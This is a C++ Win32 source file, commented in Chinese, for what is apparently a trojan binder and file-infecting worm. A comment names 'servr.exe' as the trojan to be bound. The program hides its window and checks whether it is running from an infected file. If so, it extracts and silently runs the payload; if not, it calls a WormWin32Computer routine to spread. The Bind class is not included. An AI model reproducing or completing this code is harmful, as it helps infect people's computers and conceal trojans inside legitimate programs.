#include "stdafx.h"
#include "resource.h"
#include "Bind.h"


char File1[] = "\\servr.exe";//要帮定的木马文件
TCHAR my_name[MAX_PATH];
Bind* bind;

///////////////Form/////////////////////////
HINSTANCE ghInstance;
HWND hWnd;
LRESULT CALLBACK MainWndProc( HWND hDlg, UINT Msg,WPARAM, LPARAM );



/**********************设计窗体  开始****************************/
///////////////////////////////////////////////////////////////////////////////////
int PASCAL WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	// TODO: Place code here.
	WNDCLASS wc;
	MSG msg;
	if( !hPrevInstance )
	{
		wc.lpszClassName = "GanrAppClass";
		wc.lpfnWndProc = MainWndProc;
		wc.style = CS_OWNDC | CS_VREDRAW | CS_HREDRAW;
		wc.hInstance = hInstance;
		wc.hIcon = LoadIcon( hInstance, "IDI_ICON2" );
		wc.hCursor = LoadCursor( NULL, IDC_ARROW );
		wc.hbrBackground = (HBRUSH)( COLOR_WINDOW+1 );
		wc.lpszMenuName = NULL;
		wc.cbClsExtra = 0;
		wc.cbWndExtra = 0;
		
		RegisterClass( &wc );
	}
	ghInstance = hInstance;
	hWnd = CreateWindow( "GanrAppClass",
		"Ganr Application",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,
		NULL,
		hInstance,
		NULL
		);
	ShowWindow( hWnd, FALSE);
	while( GetMessage( &msg, NULL, 0, 0 ) ) {
		TranslateMessage( &msg );
		DispatchMessage( &msg );
	}
	return msg.wParam;
}

/////////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK MainWndProc( HWND m_hWnd, UINT m_msg, WPARAM wParam,LPARAM lParam )
{
	
	switch(m_msg)
	{
	case WM_CREATE: 
		//获取自身文件名
		::GetModuleFileName(0, my_name, sizeof(my_name));
		
		bind=new Bind(my_name,File1);
		//判断是绑定文件还是分解执行文件
		if(bind->CheckInfect(my_name))
		{
			bind->Unbind_and_Run();
			exit(0);    //直接退出程序,不显示捆绑程序画面
		}
		
		bind->WormWin32Computer();
		//bind->Bind_Files("c:\\123.exe");
		PostQuitMessage(0);
		exit(0);
		break;
	case WM_CLOSE:
		PostQuitMessage(0);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return( DefWindowProc( m_hWnd, m_msg, wParam, lParam ));
	}
	return( DefWindowProc( m_hWnd, m_msg, wParam, lParam ));
}
/**********************设计窗体   结束****************************/



